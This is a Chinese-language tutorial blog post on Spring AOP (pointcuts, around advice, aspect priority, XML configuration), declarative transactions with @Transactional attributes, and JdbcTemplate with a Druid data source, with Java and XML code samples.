<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PointCuts</span> &#123;</span><br><span class="line">    <span class="meta">@Pointcut(&quot;execution(* com.fu.service.imp.*.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pc</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其他增强类使用切点：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogAOP</span> &#123;</span><br><span class="line">    <span class="meta">@Before(&quot;com.fu.PointCuts.pc()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(JoinPoint joinPoint)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;function start&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@AfterReturning(&quot;com.fu.PointCuts.pc()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">success</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;function success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<h4 id="环绕通知"><a href="#环绕通知" class="headerlink" title="环绕通知"></a>环绕通知</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TxAroundAdvice</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 环绕通知需要在通知中定义目标方法的执行</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> joinPoint 目标方法，参数不能省略（获取目标方法的信息，执行方法）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 目标方法返回值。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Around(&quot;com.fu.PointCuts.pc()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transaction</span><span class="params">(ProceedingJoinPoint joinPoint)</span>&#123;</span><br><span class="line">        Object[] args = joinPoint.getArgs();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;事务开启&quot;</span>);     <span class="comment">// 相当于前置通知</span></span><br><span class="line">            result = joinPoint.proceed(args);</span><br><span class="line">            System.out.println(<span class="string">&quot;事务提交&quot;</span>);     <span class="comment">// 相当于返回通知</span></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Throwable e)&#123;</span><br><span class="line">            <span class="comment">// 必须再抛出异常，方便调用目标方法的调用者获取</span></span><br><span class="line">            System.out.println(<span class="string">&quot;事务回滚&quot;</span>);     <span class="comment">// 相当于异常通知</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;事务结束&quot;</span>);     <span class="comment">// 相当于后置通知</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="切面优先级-Order"><a href="#切面优先级-Order" class="headerlink" title="切面优先级@Order()"></a>切面优先级@Order()</h4><p><strong>注意：使用的是<code>org.springframework.core.annotation</code>下的<code>@Order()</code>注解</strong></p>
<p>在增强类声明时添加注解<code>@Order(值)</code>可以指定该类下增强方法的优先级。<code>@Order(值)</code>注解的值越小，优先级越高，优先级越高的切面，前置通知越先执行，后置通知越后执行，即优先级低的被优先级高的包围。执行顺序如下：</p>
<p>高优先级切面前置通知  –&gt;  低优先级切面所有通知方法  –&gt;  高优先级切面其他通知</p>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Order(10)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TxAroundAdvice</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 环绕通知需要在通知中定义目标方法的执行</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> joinPoint 目标方法，参数不能省略（获取目标方法的信息，执行方法）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 目标方法返回值。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Around(&quot;com.fu.PointCuts.pc()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transaction</span><span class="params">(ProceedingJoinPoint joinPoint)</span>&#123;</span><br><span class="line">        Object[] args = joinPoint.getArgs();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;事务开启&quot;</span>);     <span class="comment">// 相当于前置通知</span></span><br><span class="line">            result = joinPoint.proceed(args);</span><br><span class="line">            System.out.println(<span class="string">&quot;事务提交&quot;</span>);     <span class="comment">// 相当于返回通知</span></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Throwable e)&#123;</span><br><span class="line">            <span class="comment">// 必须再抛出异常，方便调用目标方法的调用者获取</span></span><br><span class="line">            System.out.println(<span class="string">&quot;事务回滚&quot;</span>);     <span class="comment">// 相当于异常通知</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;事务结束&quot;</span>);     <span class="comment">// 相当于后置通知</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Order(20)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogAOP</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before(&quot;com.fu.PointCuts.pc()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(JoinPoint joinPoint)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;function start&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@AfterReturning(&quot;com.fu.PointCuts.pc()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">success</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;function success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@AfterThrowing(&quot;execution(* com.fu.service.imp.*.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">error</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;function error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@After(&quot;execution(* com.fu.service.imp.*.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">finish</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;function finish&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<blockquote>
<p>事务开启<br>function start<br>function success<br>function finish<br>事务提交<br>事务结束</p>
</blockquote>
<hr>
<h3 id="基于XML配置文件实现AOP-了解"><a href="#基于XML配置文件实现AOP-了解" class="headerlink" title="基于XML配置文件实现AOP(了解)"></a>基于XML配置文件实现AOP(了解)</h3><p>如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/aop https://www.springframework.org/schema/aop/spring-aop.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.fu&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--声明切点标签--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;pc&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* com.fu.service.imp.*.*(..))&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--切面配置标签</span></span><br><span class="line"><span class="comment">            ref = 增强对象</span></span><br><span class="line"><span class="comment">            order = 优先级</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">&quot;txAroundAdvice&quot;</span> <span class="attr">order</span>=<span class="string">&quot;5&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">&quot;logAOP&quot;</span> <span class="attr">order</span>=<span class="string">&quot;10&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:before</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pc&quot;</span>/&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--如果返回通知有返回值Object类参数，就需要returning属性--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:after-returning</span> <span class="attr">method</span>=<span class="string">&quot;success&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pc&quot;</span> <span class="attr">returning</span>=<span class="string">&quot;result&quot;</span>/&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--如果返回通知有异常Throwable类参数，就需要throwing属性--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:after-throwing</span> <span class="attr">method</span>=<span class="string">&quot;error&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pc&quot;</span> <span class="attr">throwing</span>=<span class="string">&quot;t&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:after</span> <span class="attr">method</span>=<span class="string">&quot;finish&quot;</span> <span class="attr">pointcut</span>=<span class="string">&quot;execution(* com.fu.service.imp.*.*(..))&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>





<hr>
<h1 id="声明式事务"><a href="#声明式事务" class="headerlink" title="声明式事务"></a>声明式事务</h1><h2 id="基本介绍-1"><a href="#基本介绍-1" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>声明式事务是指使用注解或 XML 配置的方式来控制事务的提交和回滚。开发者只需要添加配置即可， 具体事务的实现由第三方框架实现，避免我们直接进行事务操作。使用声明式事务可以将事务的控制和业务逻辑分离开来，提高代码的可读性和可维护性。<br><strong>区别：</strong></p>
<ul>
<li>编程式事务需要手动编写代码来管理事务</li>
<li>声明式事务可以通过配置文件或注解来控制事务。</li>
</ul>
<p><strong>Spring声明式事务对应依赖</strong></p>
<ul>
<li><code>spring-tx</code>: 包含声明式事务实现的基本规范（事务管理器规范接口和事务增强等等）</li>
<li><code>spring-jdbc</code>: 包含DataSource方式事务管理器实现类DataSourceTransactionManager</li>
<li><code>spring-orm</code>: 包含其他持久层框架的事务管理器实现类例如：Hibernate&#x2F;Jpa等</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241222200256.png"></p>
<h2 id="基于注解的声明式事务实现"><a href="#基于注解的声明式事务实现" class="headerlink" title="基于注解的声明式事务实现"></a>基于注解的声明式事务实现</h2><h3 id="基本事务控制"><a href="#基本事务控制" class="headerlink" title="基本事务控制"></a>基本事务控制</h3><ol>
<li>将对应事务管理器实现导入IoC容器，所在类使用<code>@EnableTransactionManagement</code>开启事务注解支持</li>
</ol>
<blockquote>
<p>MyBatis、jdbcTempate   –&gt; DataSourceTM</p>
<p>hibernate –&gt;  HibernateTM  </p>
</blockquote>
<ol start="2">
<li>使用注解<code>@Transactional</code>指定哪些方法需要添加事务</li>
</ol>
<p>具体参考【实践-实践5】</p>
<h3 id="Transactional注解常用事务属性"><a href="#Transactional注解常用事务属性" class="headerlink" title="@Transactional注解常用事务属性"></a>@Transactional注解常用事务属性</h3><p>方法上的@Transactional注解会覆盖类上的@Transactional注解。</p>
<ol>
<li><p><code>只读模式：@Transactional(readOnly = true)</code>：只读模式可以提高查询事务的效率，当事务中只有查询语句时，建议使用只读模式。</p>
<ul>
<li>默认情况下，只读模式处于关闭状态。</li>
<li>应用场景：一般情况下，我们都通过类注解的方式对类内全部方法添加事务，而类内查询方法可以通过再次添加注解并开启只读模式，提高查询效率。</li>
</ul>
</li>
<li><p><code>超时时间：@Transactional(timeout = 10)</code>：超时时间，当事务执行时间（被添加事务的方法执行时间）超过设定时间时，会回滚事务，抛出<code>TransactionTimeOutException</code>异常并释放资源。</p>
<ul>
<li>默认情况下，超时时间为 -1 ，即永不超时。</li>
<li>单位为秒。</li>
</ul>
</li>
<li><p><code>指定异常回滚：@Transactional(rollbackFor = Exception.class)</code>：除了默认的运行时异常之外，当指示的特定的异常发生时也应该回滚事务。即在原有的运行时异常回滚基础上添加其他异常回滚。</p>
<ul>
<li><strong>默认情况下，Spring 的事务管理器对未检查（unchecked）的异常，即继承自 <code>RuntimeException</code>(运行时异常) 的异常，以及错误（Error）进行自动回滚。</strong></li>
<li>建议设置为<code>Exception.class</code>，即所有异常均会回滚</li>
</ul>
</li>
<li><p><code>指定异常不回滚：@Transactional(noRollbackFor = Exception.class)</code>：指定事务（方法）在回滚的异常范围内发生对应异常时不发生回滚。</p>
<ul>
<li>一般情况下，与<code>rollbackFor</code>属性一起使用，很少使用</li>
</ul>
</li>
<li><p><code>事务隔离级别：@Transactional(isolation = Isolation.DEFAULT)</code>：事务的隔离级别</p>
<ul>
<li>建议设置为第二隔离级别即<code>Isolation.READ_COMMITTED</code></li>
</ul>
</li>
<li><p><code>事务的传播行为：@Transactional(propagation = Propagation.REQUIRED)</code>：指示当此事务（方法）被其他事务调用时的反应。同一个类中的事务相互调用没有影响</p>
<ul>
<li>场景：假设事务（方法）A执行过程中调用了事务（方法）B，那么事务B是加入事务A还是独立执行呢？</li>
<li>参数：<ul>
<li><strong>REQUIRED</strong> (默认)：（加入父方法的事务）如果当前存在事务，则加入该事务；如果当前不存在事务，则创建一个新的事务。</li>
<li><strong>SUPPORTS</strong>：如果当前存在事务，则加入该事务；如果当前不存在事务，则以非事务方式执行。</li>
<li><strong>MANDATORY</strong>：如果当前存在事务，则加入该事务；如果当前不存在事务，则抛出异常。</li>
<li><strong>REQUIRES_NEW</strong>：（独立事务）创建一个新的事务，如果当前存在事务，则暂停当前事务。</li>
<li><strong>NOT_SUPPORTED</strong>：以非事务方式执行操作，如果当前存在事务，则暂停当前事务。</li>
<li><strong>NEVER</strong>：以非事务方式执行，如果当前存在事务，则抛出异常。</li>
<li><strong>NESTED</strong>：如果当前存在事务，则在嵌套事务内执行；如果当前不存在事务，则创建一个新的事务。</li>
</ul>
</li>
<li>推荐使用<code>REQUIRED</code>.</li>
<li>同一个类中的事务相互调用没有影响，因为并不会经过代理对象。</li>
</ul>
</li>
</ol>
<hr>
<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="容器基本配置实践"><a href="#容器基本配置实践" class="headerlink" title="容器基本配置实践"></a>容器基本配置实践</h2><h3 id="实践1-基于XML方式整合三层架构组件"><a href="#实践1-基于XML方式整合三层架构组件" class="headerlink" title="实践1 基于XML方式整合三层架构组件"></a>实践1 基于XML方式整合三层架构组件</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241218220858.png"></p>
<h4 id="JdbcTemplate"><a href="#JdbcTemplate" class="headerlink" title="JdbcTemplate"></a>JdbcTemplate</h4><p>简化数据库的crud，不提供连接池。</p>
<p>使用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 0. 创建连接池对象，参考jdbc笔记</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 实例化对象</span></span><br><span class="line"><span class="type">JdbcTemplate</span> <span class="variable">jdbcTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcTemplate</span>();</span><br><span class="line">jdbcTemplate.setDataSource(连接池对象)；</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 2. 调用方法</span></span><br><span class="line">jdbcTemplate.update();  <span class="comment">// DDL DML DCL 非查询语句</span></span><br><span class="line">jdbcTemplate.queryForObject();  <span class="comment">// DQL 查询单个对象</span></span><br><span class="line">jdbcTemplate.query();  <span class="comment">// DQL 查询集合</span></span><br></pre></td></tr></table></figure>

<h4 id="数据库连接"><a href="#数据库连接" class="headerlink" title="数据库连接"></a>数据库连接</h4><p><strong>注意！</strong> 使用Spring时，如果连接数据库时配置的user是root的话，它会优先自动获取本机的用户，以本机用户作为登录数据库的账户，而不是选择root。</p>
<p>基于硬编码方式实现连接</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;druidDataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.alibaba.druid.pool.DruidDataSource&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClassName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql:///test&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0306.&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;jdbcTemplate&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.core.JdbcTemplate&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;druidDataSource&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>基于软编码方式：xml中导入外部jdbc 配置文件properties的变量采用<code>$&#123;key&#125;$</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">	xmlns:context的路径必须确保是以context结尾的</span></span><br><span class="line"><span class="comment">	xsi:schemaLocation需要包含xmlns:context的路径</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">http://www.springframework.org/schema/context</span><br><span class="line">https://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath:jdbc.properties&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">	读取外部properties配置文件  classpath填写路径，多个文件使用’,‘分隔</span></span><br><span class="line"><span class="comment">    context:property-placeholder location=&quot;classpath:jdbc.properties&quot;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;druidDataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.alibaba.druid.pool.DruidDataSource&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClassName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;driverClassName&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;url&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;username&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;password&#125;&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">	采用$&#123;key&#125;引入配置文件变量，key即变量名</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;jdbcTemplate&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.core.JdbcTemplate&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;druidDataSource&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testJdbc</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testForIoC</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;bean.xml&quot;</span>);</span><br><span class="line">        <span class="type">JdbcTemplate</span> <span class="variable">jdbcTemplate</span> <span class="operator">=</span> applicationContext.getBean(JdbcTemplate.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;insert into students(id,name,gender,age,class) values(?,?,?,?,?)&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * sql可以带占位符 ？ 且占位符只能代替值不能代替关键字</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">rows</span> <span class="operator">=</span> jdbcTemplate.update(sql,<span class="string">&quot;10&quot;</span>,<span class="string">&quot;Tom&quot;</span>,<span class="string">&quot;男&quot;</span>,<span class="string">&quot;18&quot;</span>,<span class="string">&quot;32&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;rows = &quot;</span> + rows);</span><br><span class="line"></span><br><span class="line">        sql = <span class="string">&quot;select * from students where id = ?;&quot;</span>;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student0</span> <span class="operator">=</span> jdbcTemplate.queryForObject(sql, (rs, rowNum)-&gt;&#123;</span><br><span class="line">                <span class="comment">// rs 结果集 rowNum 行数</span></span><br><span class="line">                <span class="comment">// rs结果集中获取列的值，赋值给实体类对象</span></span><br><span class="line">                <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">                student.setId(rs.getInt(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">                student.setName(rs.getString(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">                student.setGender(rs.getString(<span class="string">&quot;gender&quot;</span>));</span><br><span class="line">                student.setAge(rs.getInt(<span class="string">&quot;age&quot;</span>));</span><br><span class="line">                student.setClasses(rs.getString(<span class="string">&quot;class&quot;</span>));</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> student;</span><br><span class="line">        &#125;,<span class="number">1</span>); <span class="comment">// 1是sql占位符对应参数</span></span><br><span class="line">        System.out.println(<span class="string">&quot;student = &quot;</span> + student0);</span><br><span class="line">        sql = <span class="string">&quot;select * from students;&quot;</span>;</span><br><span class="line">        jdbcTemplate.query(sql,<span class="keyword">new</span> <span class="title class_">BeanPropertyRowMapper</span>&lt;Student&gt;(Student.class));</span><br><span class="line">        <span class="comment">// BeanPropertyRowMapper 可以在列名和属性名一致的情况下自动映射列和属性值</span></span><br><span class="line">        <span class="comment">// 如果数据库列和类的属性值不同，可以在查询时取别名</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="实践2-基于XML-注解方式整合三层架构组件"><a href="#实践2-基于XML-注解方式整合三层架构组件" class="headerlink" title="实践2 基于XML+注解方式整合三层架构组件"></a>实践2 基于XML+注解方式整合三层架构组件</h3><p><a href="https://www.bilibili.com/video/BV1AP411s7D7?spm_id_from=333.788.videopod.episodes&vd_source=20530c92c1be8bd70e37346e3a5c037a&p=33">实践2</a></p>
<h3 id="实践3-基于注解-配置类方式整合三层架构组件"><a href="#实践3-基于注解-配置类方式整合三层架构组件" class="headerlink" title="实践3 基于注解+配置类方式整合三层架构组件"></a>实践3 基于注解+配置类方式整合三层架构组件</h3><p><a href="https://www.bilibili.com/video/BV1AP411s7D7?spm_id_from=333.788.videopod.episodes&vd_source=20530c92c1be8bd70e37346e3a5c037a&p=38">实践3</a></p>
<h2 id="AOP配置实践"><a href="#AOP配置实践" class="headerlink" title="AOP配置实践"></a>AOP配置实践</h2><h3 id="实践4-基于注解方式实现AOP"><a href="#实践4-基于注解方式实现AOP" class="headerlink" title="实践4 基于注解方式实现AOP"></a>实践4 基于注解方式实现AOP</h3><ol>
<li>导入依赖</li>
<li>正常编写核心业务，加入IoC容器</li>
<li>编写IoC配置类和文件</li>
<li>测试环境</li>
<li>增强类，定义三个增强方法（存储横切关注点的代码）</li>
<li>增强类的配置（插入切点的位置，切点指定，切面配置等）</li>
<li>开启AOP的配置</li>
</ol>
<h4 id="步骤1：导入依赖spring-aspects"><a href="#步骤1：导入依赖spring-aspects" class="headerlink" title="步骤1：导入依赖spring-aspects"></a>步骤1：导入依赖spring-aspects</h4><p>此依赖集成了实现AOP的所有需要的依赖。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aspects<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

